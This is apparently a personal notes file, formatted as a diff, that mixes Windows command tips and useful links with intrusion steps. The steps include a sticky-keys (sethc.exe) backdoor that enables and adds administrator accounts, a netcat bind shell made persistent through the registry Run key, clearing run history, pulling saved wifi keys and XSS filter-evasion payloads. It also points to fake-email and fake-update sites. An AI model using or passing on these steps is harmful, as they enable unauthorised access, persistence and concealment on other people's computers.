@@ -1,0 +1,178 @@
+anti virus test / run history / decryption
+
+
+copy the code to notepad and save as myfile.com
+
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+- - - - - - - - - - - - - - 
+
+ping sweep
+for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
+arp -a
+- - - - - - - - - - - - - - 
+
+clear run command history
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+- - - - - - - - - - - - - - - 
+
+How to Decrypt Encrypted Windows Files
+
+http://www.online-tech-tips.com/computer-tips/decrypt-encrypted-xp-files/
+
+Manage user certificates - certmgr.msc --> expand "Personal" and then click on "Certificates" --> Right-click "on the certificate", choose "All Tasks" and then click on "Export" --> Certificate Export Wizard --> Back up now (recommended) --> 
+Yes, export the private key --> Personal Information Exchange -->
+- - - - - - - - - - - - - - - -
+
+fake email - https://emkei.cz/ 
+- - - - - - - - - - - - - - - - 
+
+folder hide
+
+[drive letter]:\>attrib +r +a +s +h [folder name]
+C:\>attrib +r +a +s +h test
+- - - - - - - - - - - - - - - 
+
+Show wifi password
+
+netsh wlan show profile
+netsh wlan show profile name=butterfly key=clear
+- - - - - - - - - - - - - - - 
+
+google search
+site:dialog.lk -site:www.dialog.lk
+= = = = = = = = = = = = = = = = 
+
+step1: Use windows cd.
+C:\windows\system32\sethc.exe (replace with cmd.exe) 
+copy sethc.exe sethc1.exe
+copy cmd.exe sethc.exe
+
+step2: (shift x 5)
+net user administrator /active:yes
+net user administrator abc@123
+net localgroup administrators user1 /add
+- - - - - - - - - - - - - - - - - - - - - - 
+
+step3: copy netcat. include command in run
+regedit --> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
+new string value
+"c:\nc64.exe" -L -p 4444 -e "c:\cmd.exe" -d
+= = = = = = = = = = = = = = = = 
+
+step4: command from attack pc
+nc64 192.168.1.19 4444
+
+access shared folders
+net use \\192.168.1.10\share /user:username password
+net use \\192.168.1.20\shared /user:admin abc@123
+
+copy 'source file' 'destination'
+copy "folder name" \\192.168.1.10\share (folders use " ")
+copy testfile.txt \\192.168.1.20\shared 
+
+file search --> dir secret.doc /s /p
+hidden files --> dir /ah, dir /a
+= = = = = = = = = = = = = = = = 
+
+Ctrl + shift + ESC - task manager
+
+wmic useraccount get name,sid
+whoami
+net share
+dir \\192.168.1.20\shared
+netstat -ano --> active connections
+
+tasklist (view the list of task)
+taskkill /pid 1316 /f (stop a task)
+taskkill /im notepad.exe /f
+
+net user
+net user admin1
+net user admin1 * (removes password)
+net user admin1 abc@123 (change password)
+
+create a folder - mkdir test
+delete a folder - rmdir test
+
+create a file - type nul > test.txt
+delete a file - del test.txt
+write to a txt file
+ipconfig > test1.txt
+tasklist > test2.txt
+echo hello > test3.txt
+echo hi >> test3.txt
+= = = = = = = = = = = = = = = = 
+
+robocopy <Source> <Destination> [<File>[ ...]] [<Options>]
+robocopy  D:\dir1\data E:\backup\data
+https://www.computerhope.com/robocopy.htm
+https://www.windows-commandline.com/robocopy-command-syntax-examples/
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
+= = = = = = = = = = = = = = = = 
+
+xss
+<script>alert('hello')</script>
+<sCRipt>alert('hello')</ScRiPt>
+%3cscript%3ealert('hello')%3c/script%3e
+%253cscript%253ealert('hello')%253c/script%253e
+- - - - - - - - - - - - - - - - -
+
+use putty for socks5 proxy
+
+putty --> type IP --> 
+Connection --> SSH --> Tunnels --> select "Dynamic" --> source port "1987" --> click "add" --> open.
+
+verify the connection: open cmd in admin
+netstat /nao | find "1987"
+tasklist | find "16832"                ????cant find the number
+
+type proxy setting in the application
+select SOCKSv5 --> SOCKS host: localhost --> port: 1987
+
+SSH Tunneling on Windows and Linux Tutorial
+https://www.youtube.com/watch?v=s7Zbj-eC1lY
+- - - - - - - - - - - - - - - - -
+
+User id :: LN hash : NT hash :::
+- - - - - - - - - - - - - - - - -
+
+https://www.zdnet.com/article/how-to-enable-dns-over-https-doh-in-firefox/
+- - - - - - - - - - - - - - - - -
+
+fake a windows update - fakeupdate.net/win10u
+download fb videos - https://fdown.net
+download insta videos - https://igram.io/
+Send self district messages securely. - privnote.com
+https://dateful.com/time-zone-converter
+
+use in private mode - 
+https://www.adobe.com/acrobat/online/compress-pdf.html
+
+check public IP address - https://www.ipchicken.com/
+
+https://www.arin.net/
+https://www.ultratools.com/tools/ipWhoisLookupResult
+https://whatismyipaddress.com/trace-email
+
+http://wq.apnic.net/whois-search/static/search.html
+http://wq.apnic.net/static/search.html
+- - - - - - - - - - - - - - - - -
+
+Win10 God Mode - create new folder, rename the folder - 
+GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
+
+https://www.techrepublic.com/article/how-to-use-god-mode-in-windows-10/?ftag=TREe09998f&bhid=27663049538559910110089906359382
+- - - - - - - - - - - - - - - - -
+
+http://unix.stackexchange.com/questions/146427/can-i-change-uuid-for-network-interface-in-ifcfg-eth-using-uuidgen
+
+http://www.esqsoft.com/examples/troubleshooting-http-using-telnet.htm
+
+https://www.eff.org/wp/six-tips-protect-your-search-privacy 
+
+https://www.wired.com/2017/07/protect-digital-self?mbid=nl_7617_p2&CNDID=50142241
+
+http://world.std.com/~reinhold/diceware.html
+
+==========_end_of_note_==========
